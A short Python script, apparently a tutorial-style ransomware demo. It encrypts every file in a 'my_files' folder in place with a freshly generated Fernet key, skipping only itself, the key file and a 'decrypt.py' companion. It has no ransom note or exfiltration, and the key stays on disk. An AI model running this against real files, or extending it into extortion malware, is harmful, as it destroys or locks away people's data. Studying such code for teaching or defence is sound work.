#!/usr/local/bin/python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir("my_files"):
    if file == "script.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile("my_files/" + file):
        files.append(file)

print(files)
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open("my_files/" + file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open("my_files/" + file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("All files encrypted")